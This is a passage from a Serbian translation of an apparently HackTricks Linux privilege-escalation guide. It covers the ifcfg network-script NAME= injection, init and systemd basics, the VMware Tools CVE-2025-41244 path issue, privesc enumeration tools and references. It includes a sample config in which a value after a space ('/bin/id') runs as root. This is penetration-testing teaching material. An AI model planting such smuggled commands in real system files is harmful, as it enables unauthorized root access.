Ako, iz bilo kog razloga, korisnik može da **write** `ifcf-<whatever>` script u _/etc/sysconfig/network-scripts_ **ili** može da **adjust** postojeći, onda je vaš **system is pwned**.

Network scripts, na primer _ifcg-eth0_, koriste se za network connections. Izgledaju tačno kao .INI fajlovi. Međutim, na Linuxu ih ~sourced~ Network Manager (dispatcher.d).

U mom slučaju, `NAME=` atribut u ovim network scripts nije pravilno obrađen. Ako imate **white/blank space u imenu, system pokušava da izvrši deo posle white/blank space**. To znači da se **sve posle prvog blank space-a izvršava kao root**.

Na primer: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Primetite prazan razmak između Network i /bin/id_)

### **init, init.d, systemd, and rc.d**

Direktorijum `/etc/init.d` je dom za **skripte** za System V init (SysVinit), **klasični Linux sistem za upravljanje servisima**. Sadrži skripte za `start`, `stop`, `restart`, a ponekad i `reload` servisa. One mogu da se izvršavaju direktno ili preko simboličkih linkova koji se nalaze u `/etc/rc?.d/`. Alternativna putanja u Redhat sistemima je `/etc/rc.d/init.d`.

Sa druge strane, `/etc/init` je povezan sa **Upstart**, novijim **upravljanjem servisima** koje je uveo Ubuntu, koristeći konfiguracione datoteke za zadatke upravljanja servisima. Uprkos prelasku na Upstart, SysVinit skripte se i dalje koriste zajedno sa Upstart konfiguracijama zbog kompatibilnosnog sloja u Upstartu.

**systemd** se pojavljuje kao moderan init i manager servisa, nudeći napredne funkcije kao što su pokretanje daemona na zahtev, upravljanje automount, i snapshots stanja sistema. Organizuje fajlove u `/usr/lib/systemd/` za distributivne pakete i `/etc/systemd/system/` za administratorske izmene, pojednostavljujući proces administracije sistema.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks obično hook-uju syscall da bi izložili privilegovanu funkcionalnost kernela userspace manager-u. Slaba autentikacija manager-a (npr. provere potpisa zasnovane na FD-order ili loše password šeme) može omogućiti lokalnoj aplikaciji da se predstavlja kao manager i eskalira do root na uređajima koji su već rooted. Više informacija i detalji eksploatacije ovde:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery u VMware Tools/Aria Operations može da izvuče binary path iz komandnih linija procesa i da ga izvrši sa -v u privilegovanom kontekstu. Permissive patterni (npr. korišćenjem \S) mogu da pogode listener-e koje je napadač postavio na upisivim lokacijama (npr. /tmp/httpd), što dovodi do izvršavanja kao root (CWE-426 Untrusted Search Path).

Saznajte više i pogledajte generalizovani pattern primenljiv na druge discovery/monitoring stack-ove ovde:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najbolji alat za pronalaženje Linux local privilege escalation vektora:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [PEP 3147 – PYC Repository Directories](https://peps.python.org/pep-3147/)
- [Python importlib docs](https://docs.python.org/3/library/importlib.html)

{{#include ../../banners/hacktricks-training.md}}
